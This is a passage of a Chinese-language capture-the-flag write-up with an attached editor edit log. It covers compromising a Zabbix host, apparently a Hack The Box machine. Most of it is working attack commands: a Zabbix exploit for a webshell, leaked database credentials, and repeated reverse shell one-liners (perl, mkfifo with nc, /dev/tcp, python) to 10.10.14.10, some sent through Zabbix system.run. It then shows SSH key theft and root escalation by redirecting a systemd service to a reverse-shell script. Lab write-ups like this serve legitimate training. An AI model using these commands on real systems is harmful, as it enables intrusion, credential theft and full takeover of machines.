password\nhostid = '10105'\t### Zabbix hostid\n\npython 39937.py 即可拿到webshell\n```\n![1]($res/1.PNG)\n\n## 反弹docker虚拟机的shell到本地\n```\n参考pentestmonkey的reverse shell\n反弹shell到本地。\n\nnc -lnvp 1234\n首先本地监听1234端口\n---\nwebshell执行以下命令\n方法一：perl -e 'use Socket;$i=\"10.10.14.10\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\n方法二：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1234 >/tmp/f\n---\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n反弹standard shell失败，没有找到python\n---\nSHELL=/bin/bash script -q /dev/null\n获得startard tty\n---\nfind / -name \"*.txt\" 2>/dev/null\n本意是查找user.txt\n\n结果显示了一个web的路径。\n/usr/share/zabbix/robots.txt\n\ncat /usr/share/zabbix/conf/zabbix.conf.php\n\n$DB['TYPE']     = 'MYSQL';\n$DB['SERVER']   = 'localhost';\n$DB['PORT']     = '0';\n$DB['DATABASE'] = 'zabbixdb';\n$DB['USER']     = 'zabbix';\n$DB['PASSWORD'] = 'f.YMeMd$pTbpY3-449';\n\nmysql -u zabbix -p \nf.YMeMd$pTbpY3-449     #输入密码\n页面提示\nERROR 1044 (42000): Access denied for user 'zabbix'@'localhost' to database 'f.YMeMd-449mysql'\n连接失败\n---\nls -al /\n-rwxr-xr-x   1 root root    0 Sep 30 21:33 .dockerenv\n发现一个docker目录，说明可能是虚拟机容器\n```\n## 反弹10.10.10.108的shell到本机\n\n### 信息搜集\n```\nnetstat -nr\nKernel IP routing table\nDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface\n0.0.0.0         172.17.0.1      0.0.0.0         UG        0 0          0 eth0\n172.17.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0\n查看路由表\n---\nifconfig，本地ip为172.17.0.2\n---\nnc -nv 172.17.0.1 10050\n用nc扫描网关的的10050端口，为open状态\n---\necho system.run[ ifconfig ] | nc 172.17.0.1 10050\n通过zabbix server system.run的系统特性，可以进行命令执行\n```\n![2]($res/2.PNG)\n\n```\necho system.run[ nc -e /bin/bash 10.10.14.10 1235 ] | nc 172.17.0.1 10050\n提示nc没有-e参数\n---\necho system.run[ perl -e 'use Socket;$i=\"10.10.14.10\";$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' ] | nc 172.17.0.1 10050\n提示ZBXD)ZBX_NOTSUPPORTEDInvalid item key format.\n---\necho system.run[ whereis python ] | nc 172.17.0.1 10050\necho system.run[ /usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' ] | nc 172.17.0.1 10050\n\nZBXD)ZBX_NOTSUPPORTEDInvalid item key format.\n连接失败\n---\necho system.run[ nc 10.10.14.10 1235 ] | nc 172.17.0.1 10050\n成功连接\n---\necho system.run[ /bin/sh -i >& /dev/tcp/10.10.14.10/1235 0>&1 ] | nc 172.17.0.1 10050\n\necho system.run[ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1235 >/tmp/f ] | nc 172.17.0.1 10050\n成功反弹172.10.0.1的/bin/sh到本地\n连上了是连上了，但总是会掉线\n---\necho \"system.run[(/bin/bash -c 'bash -i >/dev/tcp/10.10.14.10/1234 0<&1 2>&1 &')]\" | nc 172.17.0.1 10050\n\n```\n\n\n## 存在的漏洞\n```\nguest匿名登陆+信息泄露\n弱密码\nweb api可访问，用来爆破登陆口令\nzabbix-agentweb版本漏洞-远程代码执行\nzabbix-server system.run远程代码执行\n```\n## 总结\n当遇到openbsd需要反弹shell的时候，nc -e没有这个参数。\n\n可以用命令`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`",[[1570028371831,["whale@Whale",[[1,6836,"\n"]],[6835,6835],[6836,6836]]],[1570028378581,["whale@Whale",[[1,6836,"suid提权"]],[6836,6836],[6842,6842]]],[1570028562524,["whale@Whale",[[1,6853,"\n"]],[6852,6852],[6853,6853]]],[1570028562713,["whale@Whale",[[1,6854,"\n"]],[6853,6853],[6854,6854]]],[1570028566409,["whale@Whale",[[1,6854,"1."]],[6854,6854],[6856,6856]]],[1570028568221,["whale@Whale",[[-1,6856,"\n"]],[6856,6856],[6856,6856]]],[1570028568919,["whale@Whale",[[1,6856," "]],[6856,6856],[6857,6857]]],[1570028573027,["whale@Whale",[[-1,6893,"\n"]],[6892,6892],[6892,6892]]],[1570028603194,["whale@Whale",[[1,6975,"\n\n"]],[6975,6975],[6976,6976]]],[1570028603360,["whale@Whale",[[1,6977,"\n"]],[6976,6976],[6977,6977]]],[1570028605433,["whale@Whale",[[-1,6977,"\n"],[1,6978,"2. 1. cd到用户家目录，查找.ssh目录，查找id_rsa文件。可以获得稳定的shell,避免掉线后重连的麻烦"]],[6977,6977],[7035,7035]]],[1570028608055,["whale@Whale",[[-1,6980,"1."]],[6982,6982],[6980,6980]]],[1570028616975,["whale@Whale",[[1,6981,"拿到webshell后。"]],[6981,6981],[6993,6993]]],[1570028627946,["whale@Whale",[[1,7022,"拿到该文件"]],[7022,7022],[7027,7027]]],[1570028632915,["whale@Whale",[[1,7029,"通过ssh"]],[7029,7029],[7034,7034]]],[1570028797561,["whale@Whale",[[1,6719,"连上了"]],[6719,6719],[6722,6722]]],[1570028802552,["whale@Whale",[[1,6614,"\n"]],[6613,6613],[6614,6614]]],[1570028809721,["whale@Whale",[[1,6614,"本机监听nc -0"]],[6614,6614],[6623,6623]]],[1570028810270,["whale@Whale",[[-1,6622,"0"]],[6623,6623],[6622,6622]]],[1570028814279,["whale@Whale",[[1,6622,"lnvp 1234"]],[6622,6622],[6631,6631]]],[1570028945973,["whale@Whale",[[1,6745,"## ti"]],[6745,6745],[6750,6750]]],[1570028946758,["whale@Whale",[[-1,6748,"ti"]],[6750,6750],[6748,6748]]],[1570028950155,["whale@Whale",[[1,6748,"提权"]],[6748,6748],[6750,6750]]],[1570028950557,["whale@Whale",[[1,6752,"\n"]],[6750,6750],[6751,6751]]],[1570028957501,["whale@Whale",[[1,6751,"cd /home/zapper/utils\r\n"]],[6751,6751],[6774,6774]]],[1570029019019,[null,[[-1,6772,"\r"],[1,6773,"\n"]],[6772,6772],[6774,6774]]],[1570029019019,[null,[[1,6772,"\r"],[-1,6772,"\n"]],[6774,6774],[6772,6772]]],[1570028963341,["whale@Whale",[[-1,6772,"\r"]],[6773,6773],[6773,6773]]],[1570028979916,["whale@Whale",[[1,6773,"通过backup.sh得到zapper用户密码。切换用户。"]],[6773,6773],[6802,6802]]],[1570028980247,["whale@Whale",[[1,6804,"\n"]],[6802,6802],[6803,6803]]],[1570028985060,["whale@Whale",[[1,6751,"\n"]],[6751,6751],[6752,6752]]],[1570028986100,["whale@Whale",[[1,6774,"\n"]],[6774,6774],[6775,6775]]],[1570029138612,["whale@Whale",[[1,6806,"cd /"]],[6806,6806],[6810,6810]]],[1570029139726,["whale@Whale",[[-1,6806,"cd /"]],[6810,6810],[6806,6806]]],[1570029144005,["whale@Whale",[[1,6806,"cat /home/zapper/,"]],[6806,6806],[6824,6824]]],[1570029144346,["whale@Whale",[[-1,6823,","]],[6824,6824],[6823,6823]]],[1570029147968,["whale@Whale",[[1,6823,".ssh/id_rsa"]],[6823,6823],[6834,6834]]],[1570029158197,["whale@Whale",[[1,6835,"\n"]],[6834,6834],[6835,6835]]],[1570029158761,["whale@Whale",[[1,6836,"\n"]],[6835,6835],[6836,6836]]],[1570029169575,["whale@Whale",[[1,6836,"获得ssh密钥。通过ssh -i y"]],[6836,6836],[6854,6854]]],[1570029170132,["whale@Whale",[[-1,6853,"y"]],[6854,6854],[6853,6853]]],[1570029179600,["whale@Whale",[[1,6853,"id_rsa 用户名@IP"]],[6853,6853],[6866,6866]]],[1570029179916,["whale@Whale",[[1,6867,"\n"]],[6866,6866],[6867,6867]]],[1570029180904,["whale@Whale",[[-1,6867,"\n"]],[6867,6867],[6866,6866]]],[1570029181761,["whale@Whale",[[1,6867,"\n"]],[6866,6866],[6867,6867]]],[1570029182667,["whale@Whale",[[1,6868,"\n"]],[6867,6867],[6868,6868]]],[1570029198603,["whale@Whale",[[1,6868,"登陆后，cd /home/zapper/utils"]],[6868,6868],[6893,6893]]],[1570029200918,["whale@Whale",[[-1,6871,"，cd"]],[6874,6874],[6871,6871]]],[1570029201976,["whale@Whale",[[1,6871,"，"]],[6871,6871],[6872,6872]]],[1570029234931,["whale@Whale",[[1,6891,"/zabbix-service\r\n"]],[6891,6891],[6908,6908]]],[1570029236285,["whale@Whale",[[-1,6906,"\r\n"]],[6908,6908],[6907,6907]]],[1570029236801,["whale@Whale",[[-1,6906,"\n"]],[6907,6907],[6906,6906]]],[1570029237884,["whale@Whale",[[1,6906,"j"]],[6906,6906],[6907,6907]]],[1570029238471,["whale@Whale",[[-1,6906,"j"]],[6907,6907],[6906,6906]]],[1570029242209,["whale@Whale",[[1,6906,"具有suid权限"]],[6906,6906],[6914,6914]]],[1570029242494,["whale@Whale",[[1,6914,"\n"]],[6914,6914],[6915,6915]]],[1570029242692,["whale@Whale",[[1,6915,"\n"]],[6915,6915],[6916,6916]]],[1570029244919,["whale@Whale",[[1,6916,"\n"]],[6915,6915],[6916,6916]]],[1570029258356,["whale@Whale",[[1,6916,"之前文章讨论过很多suid的"]],[6916,6916],[6930,6930]]],[1570029264862,["whale@Whale",[[1,6930,"东西了，这里就不多说了。"]],[6930,6930],[6942,6942]]],[1570029265111,["whale@Whale",[[1,6943,"\n"]],[6942,6942],[6943,6943]]],[1570029265644,["whale@Whale",[[1,6944,"\n"]],[6943,6943],[6944,6944]]],[1570029268716,["whale@Whale",[[1,6944,"秀太"]],[6944,6944],[6946,6946]]],[1570029269441,["whale@Whale",[[-1,6944,"秀太"]],[6946,6946],[6944,6944]]],[1570029275486,["whale@Whale",[[1,6944,"在/tmpmu"]],[6944,6944],[6951,6951]]],[1570029275895,["whale@Whale",[[-1,6949,"mu"]],[6951,6951],[6949,6949]]],[1570029280229,["whale@Whale",[[1,6949,"目录添加shell."]],[6949,6949],[6959,6959]]],[1570029280891,["whale@Whale",[[-1,6958,"."]],[6959,6959],[6958,6958]]],[1570029281280,["whale@Whale",[[1,6958,"。"]],[6958,6958],[6959,6959]]],[1570029281682,["whale@Whale",[[1,6960,"\n"]],[6959,6959],[6960,6960]]],[1570029282438,["whale@Whale",[[1,6961,"\n"]],[6960,6960],[6961,6961]]],[1570029283708,["whale@Whale",[[1,6961,"```"]],[6961,6961],[6964,6964]]],[1570029283942,["whale@Whale",[[1,6965,"\n"]],[6964,6964],[6965,6965]]],[1570029284163,["whale@Whale",[[1,6966,"\n"]],[6965,6965],[6966,6966]]],[1570029284369,["whale@Whale",[[1,6967,"\n"]],[6966,6966],[6967,6967]]],[1570029284994,["whale@Whale",[[1,6967,"```"]],[6967,6967],[6970,6970]]],[1570029286846,["whale@Whale",[[-1,6958,"。"]],[6959,6959],[6958,6958]]],[1570029287476,["whale@Whale",[[1,6958,","]],[6958,6958],[6959,6959]]],[1570029287992,["whale@Whale",[[-1,6958,","]],[6959,6959],[6958,6958]]],[1570029290866,["whale@Whale",[[1,6958,"，命令如下"]],[6958,6958],[6963,6963]]],[1570029309239,["whale@Whale",[[1,6969,"echo '#!/bin/bash ' > /tmp/shell.sh\r\necho 'bash -i >/dev/tcp/10.10.14.10/443 0<&1' >> /tmp/shell.sh\r\nchmod a+x /tmp/shell.sh"]],[6969,6969],[7093,7093]]],[1570029311357,["whale@Whale",[[-1,7004,"\r"],[-1,7068,"\r"],[-1,7093,"\n"]],[7092,7092],[7091,7091]]],[1570029401622,["whale@Whale",[[1,7096,"\n"]],[7095,7095],[7096,7096]]],[1570029409168,["whale@Whale",[[1,7097,"![4]($res/4.PNG)\n\n"]],[7096,7096],[7114,7114]]],[1570029413027,["whale@Whale",[[-1,7096,"\n"]],[7096,7096],[7095,7095]]],[1570029548764,["whale@Whale",[[1,7114,"\n"]],[7113,7113],[7114,7114]]],[1570029549634,["whale@Whale",[[1,7114,"sed -i 's/ExecStart=\\/root\\/scripts\\/purge-backups.sh/ExecStart=\\/tmp\\/shell.sh/' /etc/systemd/system/purge-backups.service"]],[7114,7114],[7237,7237]]],[1570029550440,["whale@Whale",[[1,7238,"\n"]],[7237,7237],[7238,7238]]],[1570029551020,["whale@Whale",[[1,7239,"\n"]],[7238,7238],[7239,7239]]],[1570029557959,["whale@Whale",[[-1,7114,"sed -i 's/ExecStart=\\/root\\/scripts\\/purge-backups.sh/ExecStart=\\/tmp\\/shell.sh/' /etc/systemd/system/purge-backups.service"]],[7114,7237],[7114,7114]]],[1570029558938,["whale@Whale",[[1,7096,"\n"]],[7095,7095],[7096,7096]]],[1570029559759,["whale@Whale",[[1,7096,"sed -i 's/ExecStart=\\/root\\/scripts\\/purge-backups.sh/ExecStart=\\/tmp\\/shell.sh/' /etc/systemd/system/purge-backups.service"]],[7096,7096],[7219,7219]]],[1570029563090,["whale@Whale",[[1,7096,"\n"]],[7095,7095],[7096,7096]]],[1570029578816,["whale@Whale",[[1,7096,"在zapper配置中修改重启后运行的脚本"]],[7096,7096],[7116,7116]]],[1570029579255,["whale@Whale",[[1,7117,"\n"]],[7116,7116],[7117,7117]]],[1570029580812,["whale@Whale",[[1,7117,"```"]],[7117,7117],[7120,7120]]],[1570029583901,["whale@Whale",[[1,7245,"\n"]],[7245,7245],[7246,7246]]],[1570029585148,["whale@Whale",[[1,7245,"```"]],[7245,7245],[7248,7248]]],[1570029588242,["whale@Whale",[[1,7116,",r"]],[7116,7116],[7118,7118]]],[1570029588693,["whale@Whale",[[-1,7116,",r"]],[7118,7118],[7116,7116]]],[1570029595163,["whale@Whale",[[1,7116,"，如果以下命令保存"]],[7116,7116],[7125,7125]]],[1570029595792,["whale@Whale",[[-1,7123,"保存"]],[7125,7125],[7123,7123]]],[1570029597009,["whale@Whale",[[1,7123,"报错"]],[7123,7123],[7125,7125]]],[1570029597602,["whale@Whale",[[-1,7123,"报错"]],[7125,7125],[7123,7123]]],[1570029599406,["whale@Whale",[[1,7123,"抱错"]],[7123,7123],[7125,7125]]],[1570029600112,["whale@Whale",[[-1,7123,"抱错"]],[7125,7125],[7123,7123]]],[1570029610001,["whale@Whale",[[1,7123,"报错，可以手动删除"]],[7123,7123],[7132,7132]]],[1570029615879,["whale@Whale",[[-1,7130,"删除"]],[7132,7132],[7130,7130]]],[1570029619182,["whale@Whale",[[1,7130,"修改该行。"]],[7130,7130],[7135,7135]]],[1570030246822,["whale@Whale",[[1,7135,"目的是重启cd /home/zapper/utils;./zabbix-service"]],[7135,7135],[7178,7178]]],[1570030252913,["whale@Whale",[[1,7179,"\n"]],[7178,7178],[7179,7179]]],[1570030253151,["whale@Whale",[[1,7180,"\n"]],[7179,7179],[7180,7180]]],[1570030257419,["whale@Whale",[[1,7141,"che"]],[7140,7140],[7143,7143]]],[1570030258096,["whale@Whale",[[-1,7140,"che"]],[7143,7143],[7140,7140]]],[1570030264551,["whale@Whale",[[1,7140,"程序，同时执行。"]],[7140,7140],[7148,7148]]],[1570030265074,["whale@Whale",[[-1,7147,"。"]],[7148,7148],[7147,7147]]],[1570030268524,["whale@Whale",[[1,7147,"/tmp/shell.sh"]],[7147,7147],[7160,7160]]],[1570030270209,["whale@Whale",[[1,7160,"\n"]],[7160,7160],[7161,7161]]],[1570030270383,["whale@Whale",[[1,7161,"\n"]],[7161,7161],[7162,7162]]],[1570030276724,["whale@Whale",[[-1,7162,"cd /home/zapper/utils;./zabbix-service\n"]],[7162,7201],[7162,7162]]],[1570030282226,["whale@Whale",[[-1,7163,"\n"]],[7163,7163],[7162,7162]]],[1570030282391,["whale@Whale",[[-1,7162,"\n"]],[7162,7162],[7161,7161]]],[1570030284986,["whale@Whale",[[1,7290,"\n"]],[7289,7289],[7290,7290]]],[1570030285192,["whale@Whale",[[1,7291,"\n"]],[7290,7290],[7291,7291]]],[1570030288317,["whale@Whale",[[1,7291,"cd /home/zapper/utils;./zabbix-service\nstop"]],[7291,7291],[7334,7334]]],[1570030288450,["whale@Whale",[[1,7335,"\n"]],[7334,7334],[7335,7335]]],[1570030289312,["whale@Whale",[[1,7335,"s"]],[7335,7335],[7336,7336]]],[1570030289879,["whale@Whale",[[-1,7335,"s"]],[7336,7336],[7335,7335]]],[1570030290797,["whale@Whale",[[1,7335,"z"]],[7335,7335],[7336,7336]]],[1570030291325,["whale@Whale",[[-1,7335,"z"]],[7336,7336],[7335,7335]]],[1570030303105,["whale@Whale",[[1,7335,"再次运行，start开启该服务"]],[7335,7335],[7350,7350]]],[1570030303486,["whale@Whale",[[1,7351,"\n"]],[7350,7350],[7351,7351]]],[1570030303699,["whale@Whale",[[1,7352,"\n"]],[7351,7351],[7352,7352]]],[1570030304396,["whale@Whale",[[1,7352,"nc"]],[7352,7352],[7354,7354]]],[1570030305160,["whale@Whale",[[-1,7352,"nc"]],[7354,7354],[7352,7352]]],[1570030312241,["whale@Whale",[[1,7352,"nc -lnvp 443监听"]],[7352,7352],[7366,7366]]],[1570030312961,["whale@Whale",[[-1,7364,"监听"]],[7366,7366],[7364,7364]]],[1570030320543,["whale@Whale",[[1,7364,"开启监听，即可得到root权限"]],[7364,7364],[7379,7379]]],[1570030326450,["whale@Whale",[[-1,7335,"再次运行，start开启该服务"]],[7335,7350],[7335,7335]]],[1570030327862,["whale@Whale",[[-1,7336,"\n"]],[7336,7336],[7335,7335]]],[1570030328187,["whale@Whale",[[-1,7335,"\n"]],[7335,7335],[7334,7334]]],[1570030329133,["whale@Whale",[[1,7335,"\n"]],[7334,7334],[7335,7335]]],[1570030330335,["whale@Whale",[[1,7364,"\n"]],[7363,7363],[7364,7364]]],[1570030330555,["whale@Whale",[[1,7365,"\n"]],[7364,7364],[7365,7365]]],[1570030331341,["whale@Whale",[[1,7365,"再次运行，start开启该服务"]],[7365,7365],[7380,7380]]],[1570030336726,["whale@Whale",[[-1,7352,"，即可得到root权限"]],[7352,7363],[7352,7352]]],[1570030338324,["whale@Whale",[[1,7369,"，即可得到root权限"]],[7369,7369],[7380,7380]]]]]]}